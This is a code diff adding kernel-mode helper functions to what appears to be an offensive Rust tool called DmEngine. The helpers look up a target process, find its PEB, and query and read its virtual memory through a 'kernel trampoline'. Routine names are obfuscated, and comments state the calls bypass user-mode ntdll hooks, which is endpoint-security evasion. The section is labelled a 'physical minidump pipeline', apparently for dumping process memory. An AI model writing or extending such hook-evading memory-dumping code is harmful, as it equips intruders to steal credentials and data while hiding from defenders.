@@ -792,6 +792,172 @@ impl DmEngine {
         Ok(cr3)
     }
 
+    /// Get the EPROCESS virtual address of a target process via kernel-mode.
+    ///
+    /// Uses PsLookupProcessByProcessId through the kernel trampoline.
+    /// Caller must call `deref_eprocess` when done to release the reference.
+    pub fn get_eprocess_va(&self, pid: u32) -> Result<u64, String> {
+        let mut eprocess: usize = 0;
+        let status = unsafe {
+            self.kernel_syscall(
+                &crate::obfstr_helper::ps_lookup_process(),
+                &[pid as usize, &mut eprocess as *mut usize as usize],
+            )?
+        };
+        if status < 0 {
+            return Err(format!(
+                "PsLookupProcessByProcessId failed: 0x{:08X}",
+                status as u32
+            ));
+        }
+        Ok(eprocess as u64)
+    }
+
+    /// Dereference an EPROCESS object (release reference from PsLookupProcessByProcessId).
+    pub fn deref_eprocess(&self, eprocess: u64) {
+        unsafe {
+            let _ = self.kernel_syscall(
+                &crate::obfstr_helper::obf_deref_object(),
+                &[eprocess as usize],
+            );
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    // Kernel-mode helpers for physical minidump pipeline
+    // ═══════════════════════════════════════════════════════════════════════
+
+    /// Get the PEB virtual address of a target process via kernel-mode.
+    ///
+    /// Uses PsLookupProcessByProcessId → PsGetProcessPeb, executed through
+    /// the kernel trampoline. Returns the PEB VA in the target process.
+    pub fn get_process_peb(&self, pid: u32) -> Result<u64, String> {
+        // 1. PsLookupProcessByProcessId(pid, &eprocess)
+        let mut eprocess: usize = 0;
+        let status = unsafe {
+            self.kernel_syscall(
+                &crate::obfstr_helper::ps_lookup_process(),
+                &[pid as usize, &mut eprocess as *mut usize as usize],
+            )?
+        };
+        if status < 0 {
+            return Err(format!(
+                "PsLookupProcessByProcessId failed: 0x{:08X}",
+                status as u32
+            ));
+        }
+
+        // 2. PsGetProcessPeb(eprocess) → PEB VA
+        let peb = unsafe {
+            self.kernel_syscall_raw(
+                &crate::obfstr_helper::ps_get_process_peb(),
+                &[eprocess],
+            )?
+        };
+
+        // 3. ObfDereferenceObject(eprocess)
+        unsafe {
+            let _ = self.kernel_syscall(&crate::obfstr_helper::obf_deref_object(), &[eprocess]);
+        }
+
+        if peb == 0 {
+            return Err("PsGetProcessPeb returned NULL".into());
+        }
+        println!("    [engine] Target PEB VA: 0x{:X}", peb);
+        Ok(peb)
+    }
+
+    /// Query virtual memory info for a target process via kernel-mode ZwQueryVirtualMemory.
+    ///
+    /// Executes through the kernel trampoline — bypasses user-mode ntdll hooks entirely.
+    /// Returns (base_address, region_size, state, protect, type).
+    pub fn kernel_query_virtual_memory(
+        &self,
+        process_handle: HANDLE,
+        address: u64,
+    ) -> Result<(u64, u64, u32, u32, u32), String> {
+        // MemoryBasicInformation struct (48 bytes on x64)
+        #[repr(C)]
+        #[derive(Default)]
+        struct MemBasicInfo {
+            base_address: u64,
+            allocation_base: u64,
+            allocation_protect: u32,
+            _pad1: u32,
+            region_size: u64,
+            state: u32,
+            protect: u32,
+            type_: u32,
+            _pad2: u32,
+        }
+
+        let mut mbi = MemBasicInfo::default();
+        let mut ret_len: usize = 0;
+
+        let status = unsafe {
+            self.kernel_syscall(
+                &crate::obfstr_helper::zw_query_virtual_memory(),
+                &[
+                    process_handle.0 as usize,
+                    address as usize,
+                    0usize, // MemoryBasicInformation = 0
+                    &mut mbi as *mut _ as usize,
+                    std::mem::size_of::<MemBasicInfo>(),
+                    &mut ret_len as *mut usize as usize,
+                ],
+            )?
+        };
+
+        if status < 0 {
+            return Err(format!(
+                "ZwQueryVirtualMemory(0x{:X}) failed: 0x{:08X}",
+                address, status as u32
+            ));
+        }
+
+        Ok((
+            mbi.base_address,
+            mbi.region_size,
+            mbi.state,
+            mbi.protect,
+            mbi.type_,
+        ))
+    }
+
+    /// Read virtual memory from a target process via kernel-mode ZwReadVirtualMemory.
+    ///
+    /// Executes through the kernel trampoline — bypasses user-mode ntdll hooks.
+    pub fn kernel_read_virtual_memory(
+        &self,
+        process_handle: HANDLE,
+        address: u64,
+        buffer: &mut [u8],
+    ) -> Result<usize, String> {
+        let mut bytes_read: usize = 0;
+
+        let status = unsafe {
+            self.kernel_syscall(
+                &crate::obfstr_helper::zw_read_virtual_memory(),
+                &[
+                    process_handle.0 as usize,
+                    address as usize,
+                    buffer.as_mut_ptr() as usize,
+                    buffer.len(),
+                    &mut bytes_read as *mut usize as usize,
+                ],
+            )?
+        };
+
+        if status < 0 {
+            return Err(format!(
+                "ZwReadVirtualMemory(0x{:X}) failed: 0x{:08X}",
+                address, status as u32
+            ));
+        }
+
+        Ok(bytes_read)
+    }
+
     // ═══════════════════════════════════════════════════════════════════════
     // PE export parsing (from disk)
     // ═══════════════════════════════════════════════════════════════════════
